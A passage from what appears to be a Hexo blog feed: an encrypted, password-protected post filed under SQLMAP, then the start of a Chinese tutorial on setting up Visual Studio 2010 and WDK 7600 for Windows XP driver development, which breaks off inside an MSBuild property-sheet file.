3aa8f37d04797bc8a17642d0c9ad880ffc077678a94ceeb671b98be274a68c4499564b18033ff4d1f52e356bfd7f84736dc0d4de7b8020f8c456c2838a5336c93cdffdcc18ed1e576aaa8f6d0662cb0716b4f4d77db3164314868e2d0322f2f7bf305176f9414a01ad7ebd8e41b43ded161e7c121f4d1f070f35d408d624915cfbd06a372fb47b6d7ff4dd89ad55ecd84e739af934d7a1a415f97efb4b310132f316753ee39d68d6eae50ca7021a5e88f76832f1d33ad435826d89f9c5e910989d5dde45df5eb84cd9c8c0200a3582a642674e8e1a1b00ea987411a593b80f9179958a93b952f343a1126c7280b8c35b1483fb1d5fa8d4cbeb25003d506b681db8f462dd4a67c39ba4d3ec5d198103bfe7ab146dbd35f0e3be5a435a6217682256f2859bd2b497168d4bdd870268d7bdfd95bb95e789640d1b3130ee958efe7811c0b025ea2536c889adf10bf1569f5c2f303396f2d2aeba062b26ae82dbab0e41c7f244b39e9d83a8c5e17f55fd9832672a86b831f9ad853425e79dc8bcdfb36c63bcc597fa074d463b29876f93f22426731921728e45f4b30b68009b9ace0276b5c25fe9320fbb9e8816ee9403e1f8188ec0726c1d424d535cda5abf03d9e9bf7034f677fc6a508e7f43ab11d237cc15cdd9cf533204f75828d2511d9a99c320fb5ebb64ac2e1b2397cc9769e1b2f56da5d6ff43b8ccb584f5cc345e7c6ca48f1cd11237ba9bee551bf696ff974e52b64461af5b06c24b21c6b8b06000da418df0cfa9ecd9067ea8fc59b29f292643c3fc12d6a15060838f1b076cc2b781075fbc30297f86e545bf4b2a1733907f5423a605a3d2914b21cd84195fcb91d5453846a2f4e35b65d8441e2832362e8fa9c4d813e77f13cad8d641d579ae57a7d597ce0142d2bf7a0e0cf1c08538e75a3a7bb4e18d9ef401c4af1594ca17c8377876a66d748180d20029014979cbf6eeed5f027d1488ed24a6b3490e9fccce8f471e4a023363964301ff2b2056ee39ea1f68a7af7a18ba1cdbfa7cfca42c9e5672c4d2686a08f790f839e31c2e0eab6bf9197c95835e4b87712b6bfca88467d5515cabacf0e53c3f9f8a0f1fb21f8d35c5e775cf0c6569be8c9493e912c1bbd9c88af762bebb58b2376ebe5b952280d8fdac374e95527031c6bddbfbad2a7347cb8dc27c6121ce3457a4b13571ae2a5ad59b171a7bfdabe14bdf36a524a4763f52e29e263397e49ee85451228ec1cd06b85f12e741fb2080e551094b8e7954aa9f69ac0d75d97f4e47bac4f2dfdd1b612bde0810cf679d5e062da6be8fabc38548a760fba0d8a5f3476e953cd31c65a4c967c8d33b531469ef397ae1ef341132721a2bc7a5d19c2495313c242d1e30e793d09756370584246ee994ce648c89641e7c9c97eac6bf39dc91f73a16e869af1c44e24cf012359bb9f1fb9ec100b253de2d3202990898a0801e7fa560eb4e9afddfc50e0c19194304b111bf5a749e3b4867f8ed9196525417776238b088e14394ab14a52d774fb5097bcf1eb08b479dc00650521d5950c86e4fb438681cf5151fdb739f3f1b1093be0bb559e6c822b1b04b3a282176b0fae04b1733ef6d9aa340c5f9dbc7a0c84b3a058ab341fb3e13907688007d6753a2123ae13c5b73e895224de1c65a3ec5f8f0d692026dcf55aa294c17c263f4283f90d9d855c9adfe07429815ffb9580ca96f4d116aa92ccfa3fb1bcba03b5c4dc67d81d10e0779a2288aafc010ad496eb616ad4bf8cffacc87026b4eb3f8bb41473e8d1a9198f776b841602f7881dbe22f9e0acc31d72f645ee87027284cbe83628d2e541f2f3fe60c68c0fbeafb9bac20ad1f4b9509adf37ae9dcc7fd82ee8b0235a3e5694a2a52e5332d6750d92cc4670b10e938f88ec0d2dbef382a3c953fbaa89d2e97f15e46411df5f51f116944fe920aded37c63ce2f7ca2bfac852b01aaacad420a928c820a4cdfa86e611efb165c1bff2d1354649221defc3ea55a143e337efc190bfd5d16b8b73255c8f8aba1477861b5b85fbde2cc40326d2e967688599aa6c2e68996ad4e3cc1af747c7f4018ae6dbd4f181bb343a844705edefa79e97ae7b82dee0ba21b585bbacc4531b7ab21a15ab3a15e27b28de53a75545c17343dbeaef5f40daa140aa43bf74d77af8fd7959757e8d0196f330b55b2989f1ff74306af98288e01fe0efec068b096f2216c9d3d77393ea698bb2029e61752f4f17a81a86ec2f0c6011eafd378e63f4910d5ce33f6d15466b107a41dfd3c7a8b02807949f8026ba8e97c058ce9f4de94abb138fca15dd3e38189875918f0ede4cad217a43a6c5542f1dfdc69d3c201ad584baced69f075e18b6c64ea3b949ec04f4d600f2a844c9f4166b7ee6d565d4f981a3570ed3597cb9ed5b9b7e4974a4ce3e9abbab13483dcfa0a148c518b5c34b698589ec3056165e4d5a8cf52bf76335c156a42cc0ddea234e9ae590daa7b38f54fda71af4803d6d20c5c88822ba4089a7072bc3607946c8da2b30ed63926feee0f271ca85cf9b4a216f0fddbb439394ae4be149e30fa4a05de42c68e26f24778627adf345b5516ce70c61c87018542925f9550ddcb51b14d3b62ab93d765ff7c7946e37f69629d8772a5f93557fa10e108618ab6cd09287eae1bc48d45fded505a1e9485e7260ff953e63683e9dcc2f5cb553c585b567e0f15ed20592277f7dc55f971b1885951dcee42179ed5ddc89a3c6feda04b6c62cda285c1bd0157c313982ffab373e63b9bf2eddfdf72bdd68c9e273757e60dd8cfae351e91c9a015a5c0f28986b3b14dbdd816f5de6d99faebb1a517934941adc552fb35e06e5abdb64d1ff72107c5026b168e968cb9b265afe8b5624b15b828682bd7b9206be90a3a284e625ebc9be9faafc491877444c7b76ac41b86f34912a9dc2b79bdc691fea8e2cef27efbd765303da09aa19e760a27466c6a962cb82f8467f35b150237853a797040b68047c2c8d8cff4777e544b50b4e89c541cf4bded4793509d446e69f77e8cf57876767bd97da329132eaefe0f3f18c3151f71a77d3fb80b979412e39abdfb2b1c080a1a09ba64e6f194379e5860fe10ecc7e6d2f4c053b745de4a710930bb8955c863e4b77a423426851fadf5c8cc316cd66b7089cfef0c4acf092df5619e85b85af74f93defeadab9c1fdfbd4a3e16e3c2767e809b737cd49de07ed2ae77892dbbfac03b820d9ad9a905618cc82ec6182a578d8139298069f65ef64044fdfdb07f25a431a5c9d9c2ec923d1d253754b7bb298a7046c21d610ec77b7b5878ca1064316f39fbbba9173830ee7f9b8217fc8b95d36d60f2d37c1c99ee97dd24b882c45ad60d9ae0badd4d6aa72fc6755e5dc19416c834fd40ea19b0fb1a06c66e5e0f3e6df555b515751df5b959616aa3dfa0874106b80eba7a359d399447b7b7d3715b94ba5e2d48b21fd8557e651d5183232bc7a1ee853b42ae44e6afe102a37f8043af56012218ffde27f88f8f35000d63270e667e74c2ea289be6ff12f393a186d5f44f1900c90d89f760c09652580164df2bcc718ce2fc0e2852b7be318985927c2067aab84d07f959308b7ee977d02066e52be296c144643857fd3fe99f47a588017ee6967cb1f462c8dc53e1584d80d942a6d7a8ac8ae47dcee0f20d4a0e25be2d1540f5820213d0861e4a1a8e827954e55427d6f37845f7d6fc08e2495b58633151326e72ab5e3e05c943fcb6a31e74bac6dfc05a569c6a2314fb4e66e070ba58bc758a73a581ef98972bb39cfe0c61dc691bedbf2db2af11dce274174900f3525a1702650f3df9109bf91241c182d02dfcfea081e6d53a8223f61bc432e4eba6b6a4a4653aba915e9be97713bdfd4f39db4524258bb7280ad127938f9875947f1c6ec4aa3d1e1ce3c679aa1f9474a6f6d4a1daf5f0e96ee5237934fd4587d51706fb75695573e0101d1be756e18db32785093b9a6acf96ee450e9eb584d1344658b49e46042d4c5ab43e5776127c92ad5b199f10eafea8e34a16ae335cc31c85d406854d1b880251fcea41d05ed9b46baaaab494b281a44b183324d24f70c75d2ac47fc5bdd758312733da326dfe1b53976ad70a4ea133bb5915be88102fd776da63016a4117c50e60ca2a9f3e7158496baba43ac36f2996766bc9ad84d23cda09ab13f75bea5bb2b7377113766b05fef67f2c153851c3456e5f07b06ae58f4c979e68fd5856b6625393771dc6b38d9fded35aa99eb95a23f55587049a62b371d770c39e8e6e6b40da8223baa81aa4b9d47d7ee4cb8c002ec74cffa8a893e6ad6afe8643c736df9213c1f0a36471738f7004ca9f284517eb30eef5f2946b3f1db58d410997a8dbdc931204bf27b913dd855daa67f34e3ff2768aad4b1ec5b68dabbba236c624a95e0c655c8eeac68915f57d57f38e0477ab6102d00cf6808615145bbae629d898c59ecc9f3cd45c9a571c48a1a43bd13856d5ac926863187f4696094a14109c39256cdbc4df80f91f241044f46c08144578b52123bbe14a22eb5b83dff34712402002a834902665dbb6e0243631f2b5910c1224d31457deab7ac1fdb78fda286fd91581f30918d68dc2b90ad2020ab5236f58338f91a80ce712b3ce7d3189798bc36d781ee3960d29bdb06395db0251c7adc483ac6f6a9437ad526cebf6b2044b4e7fa866a4c4ac25bde714122c20a139d59a6d5b7609acd1f62d3ccdcf498aaebf76247d36ca5aac94969bf52b92e8869b4036f65794ea2533e3da1edb84d874373da2ae9140206df5f0b0d19655e3e9a70bec25d0c035ff4301bd75f1ad8d777bf15b37193d896c08f75475c0be6cf449d76c23a8226fe3c60b178c550a034b1b59dc7ead93f9947e9f631590bf5b778f6cf47347e5e5c22d932d66a27a96978aa6002137416faaa2be28535c53db45c4b4a8aac25eba47fc4c8e2fe4b0694f58372e00235e98eea85e339672d26e2315af9126c895484f53bd27a9ae096d745fd88dfd85541a8735db3ab76948320f3d81abd584cfa943acb80d0377216612f5862c7ff2fc977453799dcb1997d240f630cb0b22c16b7f7f68423c2a84bcc55b380a87949d340de18252b6614ddff15d11d69961da2006a7ac5ad0191f4614fec48a78299f3001f72ad3eeb6e0a7d3a1df7f287f2c8ff6cc975283fa5dde02ac0efb64b8cd1d90f439670aa98fc5ecbcac8cfea85a9752213563f2862018fc19b74a637bf36b64633a9827bfd4c63b0a24165289a006af18ad7ee8b0992fe4f0fd02d4674c6090f61c2e290c25dbb7bb6a231de68083da249d217343df0e03bd1445d53cd195721ca12408dab57006b05b384cd36652d022d6d2dd58f2f75d4b17854561d536607ad8edf09396128b2ab7f83e2b597dbfd34b8c5cc6ce681e3870eaa3b948c697a7d3a7ab4c84a3077dcbcc95ecc13641475788081285710c7df9b0abb484f818ce7f0e86d8890ef50cc6706c6e32441a19e0f465c0afaacb66502028755da04b9bd2f8ffbb1e51eeeeed43f0c9ef347058bb5b59b7f29277de727a40b75eb7f8657a2342c480eb0ccd0565d922e6ff848f296cc716a17cc6720cf2f9418b2dee2b36e85c3999d2ee07db310a8a0e1ad358e46d6402ea44267d1f8e11a9e73505729ae6f4ae87f36d7d0adf78c56b3ef36aaeaf671178b53b4ecb2403b50b794486c47533425f7791b041b9d9552b13e31e5502c9e38ae4a7f5b105c803b720000031896edb76f139d5157d797782dca00022ec4bb81262ddf040dabd4db6055d03d8af1a7a291fc871b86bd3cac49e48c1046e4208b859ddc0777d80094b1af4525616c48b6dd06eed007c5ba2c7b145f91cdce9403b20e41979212a726bf9ae890b920a5e8de82ac60a43afb71f60802d687436c354f2ce60606b96b6fecdd130d172afc748fb82de62c651154d46c132d6ae5aee28b2f6b6fbfcbe3c907d7a8144751cff4f322edc94d6f96fc7b489931898b85f6335137889eda17e64539ac515e8d92b1192ecb3af309a1b8d761dab797173bf0421d9e1f7d5451ae474a012b2d1dd45513509ea0ed2b91dd9af9dca17f33de63a48e61ba153aec689709c61146d75ab2b44283dbfb1b28afda0598ccb3e92ee3126a7dbdc2151fd436b80b9e5750b4ee07c512cd42cb2f622c3db4b176bc05b3cd4b2fd387977989ee766ac0391b89964d7285370d1d0f09f2e3b351037c9f537d2b888b3da67eb8203d0305dbf9c100f32cadda6323d8c3c920e3ff3d4e4adcd9468c452dd5fe8fee42ca8242c976e4442eb694bd7ce95f7d7b249f7a6aec5244ed14e9ad4b828cc5620cb7b5549966d9988a61b062091331886a8cada6bbe6411ed8e81cf1d56a0be8fe382f3784f28e20d228ce22a55784b053eae9b60c7ea129228368331e75260abaf34a22a2779a63820dfd7497dd042a815cc096ba442d54303f89f495b6ec9c8f0cc6a747a1d0bb87566c71d8852ec006871261e7ec901954b51ff31fee96de0b06688b4106f89c97a155201dcb407f6f763966ce3f391fdbaff6435c7109cc5abc8022b5f7a59aba58e72370ee1f85acf5e4545892f3b87e0f1d9ccd8ef0cfe794545931dbb6d9d35bbc58701db0a1e70483cf064e16258d9648d5259de81185ba1137c80b37d812e3121b6cfc2c954359a4a59d699773e6b8937577bc48d07c4375c882e49318d54274959f47101bed4779ea1ceccb27c8292a632fb70179f9d0917d138b658b1af224ec45070f2a66d7895bab3418de485bb602492233b4e1f361d40dcf5c3637f6aa6a318195656fe289340deceff6fa30ade3139c67d37b474bdb97f1d5db79cc2ab05c2d79b52d474a3ebf26c354be08c2da353f50b346bf258623491faae816827f7d87d66317af6f9cdce5b7b4d60e0cfa726a9070877666fcb9c7334161d614fc343da9eefea441453ebdaac63d6ca408fc397cfb0ab5fce23fffe0c77f0f506810e27caf33157dbae9b34a756e73a8c4144e749cffd6cee63dded0c8a5e9d19506455b11e195c6f7a668a55458e809b0786fa8c426c80b101786d1374c40e9226c28523c0e87dcda8f65fad41279590da1739d77680c5a7a312bf30c79d461f392f0107a8522066f536a10892c7bbbba7a924174620109870ed5b89b40192867a18f6a1680b1c5c9813f22d5197f1b3192b2351781c98479123f8be5c9fac025eabc47ec8795ef2befd9882a9665bde38b056eecf353d5722e15ad03b68bcccd7dbeae05d57ddc0e16e2f5e215b7037930b01d7eee09c87ec18c95967c4332e12343d4293eaf2cb381d4f39d19285b215420748198ed1d8151c10aefc83348700a6258b50e260401fd0f0587c9dd3dd8a22e5fe7258b7b89e815311e87cdaf5d52a0710561408eb7d0e28154d06328f64575c6976c14e7d9187ddf363f4b53f3c0cc3e78d8bd97b5041f31009d22aa6ba12758a91e316add131cfd1f9c9ee0dfeb5d7f2c1a51cb309dee6348a942973d1f950e9c05a80e99258cabbac6dccc921a55ca955ff753fb7a7ab3e15b9d01bb16e6833cf6a1282a4aebcf814610adce404f79928203b4273e5f890cb73f4c4c08857481e40623e71e5b19d9b294e47caf8e73393214e41c1a6a45fe999dff1cc160194ebe12e751d38807323650147e8813a74d2f3f050bfea2bb9b0184f7c01d4281c0a260d2dd8d3b373877254441fb1fd311aae1db6991db0a9906307d487dc93650798b4cce74a9f32fed510c7bc5a434cbed0b441c48827380b67e899a8572d6ae7eb3350bf039315c899a02b4dfc5fb7d713b7647098345ee4148394a0dbae3b9786bc7bd580327829bd07feee993aa5690f216c250c19a9e4deef913df67a86f85f7a620d1f8dfe860ce41c2d5347b14b17662e82f9b00708a88c0d364f9ee068b095c73b5dc7f8b4e5e600cd9e02baa2069f537291bad2426fbc32cc9e124f50d584c1114debdfc2c3e81e3f00bb94e68788333fd77460982417112119c32394dddb9ffb39b89c2bd2e8fee5e33e50b11eed8d71f395b86a18249328e3835cfd6a8123742cfd39b38016f76c5353a8e6699636e84ae08782b2fdab72370b369b0b322b64fa0af42d70dbf0c0b8b213ea88a76830ed1a14d7750d7011c8356ce4383cf6e60d2eae8b90632f66a0fa640e1b47bdbd2f6c9ce080f54b4066add81c521be9148c162899f18671d3dd227274a7a1e1dc33bc3b695d5519ea80b489bfab052be64de6717198febefbf70c1c19039d91ceb513b58019cd420b492f6be83e56d9eb9b051dfb829cf43c56fd9e1fd65fc1f951a69f5e93b5a87f3903ddc264e995b58d6907ab3ff79d4be61cc443e63a08b048f2578de706ff951f2eb04e4eff8d6ed070d521d51a628c8902dca511e854bdc72dc57ff5d03f109b5d69bc860fc5bc1b41037761d132edb60b1e53d98fda279511ecba5e761ec30b611a5d1e9b74b47a430d1c8eef42075a82eb267a53d717c1c4cb915fdd1fffd69015804fbd22b640226db053ece4a4c7767f9a9efed12e508b37e140bb4cd2d01270ca64a20b6f9252e8219ff5953ba464a0aca3e0b3dee3d1b4243c1a072cf57ff2a929565f0a9b984c41b13070b1ace841fd9e2b2ef53f4ecb5e20b1b9f33d46be5d147805fe373f3c3f0d7a89d6cc68a60da2ca1256498fcec144e9eef4689e91314bf71212471c508ba055866f473e9260f215be0b6e5e34e620059094981f48ea9e278ad522707f23a11d5e9b9c480e948360798a393935accae2c03feb5ac66ce28e2b3c8f0a30de91c85d7fcc547d9d9c71384f4678b79d94b66878f4dd54cd207ba2b6850b924ec651a3f32ae8d0797cf0d52461ee1b29f9a1875c864cfd8a6ecd5d54f0552cb5893a93da25d589b52d2cf2cc18ee78b3969a4079fa9fa78b97d5fc71504124f20a7634a2dfc69e29b14da54c09369c224b933bd15e72918ef661d725809d14f2bb1ff472b2613f490eabe265e4c9e7f51f9b5ca1569dda17b3eb49bf6fc670d66e25a68d13f9445672619ccd70dd9b1f482b046f04705af6b0812c4d2a78ee8a0a45fc129d4771bbd9fd30c6779b648722866a344cb9308f844ff38c1ad5d81c6447a651643b3faaf80815a4dfd8c3e260d6e4943c32d96ed670eaa65b18fffd421dc41d3b1f162e2ad29c56985bc9348481c91fb8672d9fafcbac7f0bab2faeac0310721fc6a2735dff805125f0c58cb2d1b7edadc120b16b34d34cf7ecddc2e6f56de97cef6a5cdfc0a7232d9d8873a2fa4c4878f533c6629a54609ec6cec459d0a4dee07e2344ba6d16b3ae8a48ce4e85bc0c826f96bea08694d70c2887c9e3b67db326545cb0773d115506748f5320d9badb68208fc0be9c40dd2bf739b4dca037858768d138d546130e71dfcb480423170aa84f30ea5d81b3350facafc87feb1ea50cd8e41842c6da1e863ebb56a8385c8dcf15264c1874bd77d0ee0723ea3b99ddc4096ef2d10f17d7f465df707ab5d1a7c24aa733bb848e600b356449c6822c04a3d0256202dbaf4fdf47fd1505e8c733dfc2701f25d84979a9a28a335ee632cc11a05f2506957f7b5a8f15425afef23d1b7cd913c887426fbdaab1b9be740480767811742abc1248dadc866712a1874fdb25df3a62e32653fffd7b75b2d054b1838a24e27ce739abc0abc52eb947928e04f0582b200940aeff481bd3637e26e71d38808df38ecea54369de5c0f7383b747afca3eda78aa06be29d91f3486c90447caf8b709263f81eb30c4e06502b0b2925d1a3240b1915937d98c908453c0dc9fdf36a792a88de6e6d6406cc45444a549a1f77c480c0893fadd00aa2dbb4a039ece8b828348147d94396feba259dc5449e9f65d8dd8e29aca98806cf562169ec62c99c90d049e729b7d998a2b100c208537a8a2e3e35b7828bece3e09cdc9f3f6f34e868808a0eb43450cb526d463decabdab7b5e50523494b77d3bc99374d9203f20f9fe3dde813a256f73a3bef91fd180e499665592ec484b9e57d1679368d2bdf61808765170970fb09812e4705e03257b0129be9e0c5a6c938efb1b4cdde9b4e3ef68fabab447c6d4338af0edde2b499bc63d11135c2d44ae66010db312db75725b1496d8e2b78fceb3dd8dafe17c943bdfd68f6e34539f2501561180a9a474944017081c534b1cef3c2cb685b5ef8433c5a9b832e6a39e9128b8453dac6d70a4b0cd100d61cb966cfbb463b5fbc2773be37b459da898d876aabbb4ae1b03b61397fa62b91d76e016ad3de6332dc4c349f210f958472e698bca731996a5a62e43575d836ef8cabd1e984b7c96b5dba34c7ee9fd1b0b56a32abc8cb8f70ce5f541120fcf0ef7bff281108b1e0d65b22fff060b935846fb4f6ad20ca825927069977a3be01f68d60d85a8ceadb9771140fe6045f962597672031270eeba302bc0326da1b6ba6ec37e82e1b399de94353c3f72de2b197962b7b757e1460dbb191f1833be22dd5fda970b39026872ac518a5f92d10d41393b2031faebd847d74a113cd8806589f0eca5a08c2f4ec688189355406727fff18f1e9500944b380f9e1f30020591db62f6122271faa5f8ef300338be318d8e61311c2bc1c704e867b42578221f821396e19264fca29fc8bda3297e4984ddf558d2c3b97b350b64e53b2521cc9dfb670551e88f171e7a2524f73203fc2f1add780ce421c49cac624ed9e2c70dd90face2a85b2d79828725cb8c5b716387dbab12ad2184c05cb948bf2fe9a30360682e3dc73130f502831c5a1a687fd8fae76af2b29725d8cca19cf966355402ca59c37c0db56375bba0256bb3090f58f09f68b0226e6f94cb2e145f8ac72eca52337a6a81c14fbafaa8c559618ce5b32035b6cbfbb11a93e2e5ea9c106154e3178ec071c49afbc9d6fc1cf40e1422c571cc086e5d1c0bd064f2b16e5eef5c071a5cbe1d4272399832e262d74117ae101d31a98767533064ffc24549903fab65db294fb5ba20ecaaa63f840cbe9e9275215c7aedf379f970377c5b8415ab50962d43c58f862bb088d01ba1c8702c3b748efd6486773d3a06d8ffb78d9eb590a750bb244a68a0605f6dc33141f63699b7cc565ad5a4f3b1de63d2c34b7f8d01cf6ba2e88b7abebd6c0552916d2510db2c519c7359bf5231caab4df5e4c177593304f3d18593f9c5778aa68e028c3dae4a26fec708c23db289e80f8960af545f4229992a26a1b8670a6bb606be79e70dccfcbe03195a5d95c77b7f304f02acaa7ee1c46b8b1e4a78f186bccf64377c3144dfb480ed21bd17233c023cdb1ce71fcde6781cfbaac72be6a5e3c6d32f1bf6225b75c9763b8f8ec57b7c9d708ce0d766d8d47a9a60e498edc4d6a318397f8de8b824e3a850dca810f5b6f7bb943d7193e347189cd9d9edd335f8f607cbd48aab0b5047ed11e6116b393296b4a41aeb0dbed7ce3135500a7c864b84d94006211e7a35cfabe64f7e2b27aeae6bb078973c7a75e18312084a3e38c616c5a7a36c388f6b76d55754d62baa4e79ea6a488e8852864a8181831be44d8b8f13eb8d2ac3d131b0c9882d7b0bb58a2b89553be5d0129d97e3284dbd32b01af0b1b24b7face901712b038832db9c2f775bafefcb42d818b211f4bc065ccfe551ae2c830231ba2582456483549bb7caba2958e7daabd7ed397187b136751c69992469ab2a7c8701408830152e9ff768257c85f0c3a10c21b76edcdb50dd18181391c0e3090b0bb85273b30f9497fd6e629f789fc7df39ee1cd9611405b388ac7fba43c4eaefc795c6cb6a2449edb4c22ee0acd17160f2b15fc4762c82ed8ae7e9364c438559dc7d632f1a37662ad4cac4f761ee6ec4f370d6756de8e18e07c0421362f83de2f3e40469755a04bf051f914cb54c3231f5036871541cc1267e52639e3601e9b0c70da5351959fca67e47699c8bd0d10c6ce8882ef1cc63f696732ce0c6bb048a82161eea2efee0ff510ca26a3178e8a1577b0b8f78347982a396b08a5d759e7a5d6a145e14d6ffa056717c530d66ab5ae9de1a1d4ad91a79c39564385b6985e97944801ad0154ed49c3a834111e5ec00d4615cf121ab52950e0d6cf132b11b2fd7737caee9e94d5a1eb914d1b5e73a2d186ad632d0eedff31954ffbb73e4b7979043815ba165f783ca89158eeab7f39b019</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Kali-SQLMAP</category>
      </categories>
      <tags>
        <tag>SQLMAP命令</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows XP 驱动开发（一）</title>
    <url>/post/WinXP-Driver/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="1-环境安装"><a href="#1-环境安装" class="headerlink" title="1 环境安装"></a>1 环境安装</h2><h3 id="1-1-安装VS-2010"><a href="#1-1-安装VS-2010" class="headerlink" title="1.1 安装VS 2010"></a>1.1 安装VS 2010</h3><p><a href="https://my.visualstudio.com/Downloads?q=Visual%20Studio%202010&pgroup=">点击下载安装镜像</a></p>
<h3 id="1-2-安装WDK-7600"><a href="#1-2-安装WDK-7600" class="headerlink" title="1.2 安装WDK 7600"></a>1.2 安装WDK 7600</h3><p><a href="https://www.microsoft.com/en-us/download/details.aspx?id=11800">点击下载安装镜像</a></p>
<h3 id="1-3-VS-2010开发驱动环境配置"><a href="#1-3-VS-2010开发驱动环境配置" class="headerlink" title="1.3 VS 2010开发驱动环境配置"></a>1.3 VS 2010开发驱动环境配置</h3><p>VS 2010 本身不支持创建驱动项目，所以我们的做法一般是创建一个空项目，然后修改项目配置。这种做法容易出错，我们可以事先准备好一个配置文件，以后创建项目直接导入即可。</p>
<p>步骤：</p>
<ol>
<li><p>文件-新建-项目- Visual C++-空项目-名称（HelloDriver）。</p>
</li>
<li><p>生成-配置管理器-活动解决方案配置-新建-名称（Driver_1）、从此处复制设置：Debug。</p>
</li>
<li><p>视图-属性管理器-点开左框“HelloDriver”列表小三角▶️符号-选中步骤2新建的Driver_1右键-添加新项目属性表-名称（DriverProperty）。</p>
</li>
<li><p>到项目目录（C:\Users\alvin\Documents\Visual Studio 2010\Projects\HelloDriver）中找到“DriverProperty.props”文件-使用以下内容进行替换。</p>
</li>
<li><p>之后再新建驱动项目时仅需执行前2步，第3步选择添加现有属性表即可。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Project</span> <span class="attr">ToolsVersion</span>=<span class="string">&quot;4.0&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ImportGroup</span> <span class="attr">Label</span>=<span class="string">&quot;PropertySheets&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">PropertyGroup</span> <span class="attr">Label</span>=<span class="string">&quot;UserMacros&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ExecutablePath</span>&gt;</span>D:\WinDDK\7600.16385.1\bin\x86;$(ExecutablePath)<span class="tag">&lt;/<span class="name">ExecutablePath</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">IncludePath</span>&gt;</span>D:\WinDDK\7600.16385.1\inc\api;D:\WinDDK\7600.16385.1\inc\ddk;D:\WinDDK\7600.16385.1\inc\crt;$(IncludePath)<span class="tag">&lt;/<span class="name">IncludePath</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">LibraryPath</span>&gt;</span>D:\WinDDK\7600.16385.1\lib\wxp\i386;$(LibraryPath)<span class="tag">&lt;/<span class="name">LibraryPath</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TargetExt</span>&gt;</span>.sys<span class="tag">&lt;/<span class="name">TargetExt</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">LinkIncremental</span>&gt;</span>false<span class="tag">&lt;/<span class="name">LinkIncremental</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">GenerateManifest</span>&gt;</span>false<span class="tag">&lt;/<span class="name">GenerateManifest</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ItemDefinitionGroup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ClCompile</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">PreprocessorDefinitions</span>&gt;</span>_X86_;DBG<span class="tag">&lt;/<span class="name">PreprocessorDefinitions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">CallingConvention</span>&gt;</span>StdCall<span class="tag">&lt;/<span class="name">CallingConvention</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ExceptionHandling</span>&gt;</span>false<span class="tag">&lt;/<span class="name">ExceptionHandling</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">BasicRuntimeChecks</span>&gt;</span>Default<span class="tag">&lt;/<span class="name">BasicRuntimeChecks</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">BufferSecurityCheck</span>&gt;</span>false<span class="tag">&lt;/<span class="name">BufferSecurityCheck</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">CompileAs</span>&gt;</span>Default<span class="tag">&lt;/<span class="name">CompileAs</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">DebugInformationFormat</span>&gt;</span>ProgramDatabase<span class="tag">&lt;/<span class="name">DebugInformationFormat</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">AssemblerOutput</span>&gt;</span>All<span class="tag">&lt;/<span class="name">AssemblerOutput</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ClCompile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Link</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">AdditionalDependencies</span>&gt;</span>ntoskrnl.lib;wdm.lib;wdmsec.lib;wmilib.lib;ndis.lib;Hal.lib;MSVCRT.LIB;LIBCMT.LIB;%(AdditionalDependencies)<span class="tag">&lt;/<span class="name">AdditionalDependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Link</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">IgnoreAllDefaultLibraries</span>&gt;</span>true<span class="tag">&lt;/<span class="name">IgnoreAllDefaultLibraries</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">EnableUAC</span>&gt;</span>false<span class="tag">&lt;/<span class="name">EnableUAC</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">SubSystem</span>&gt;</span>Native<span class="tag">&lt;/<span class="name">SubSystem</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span 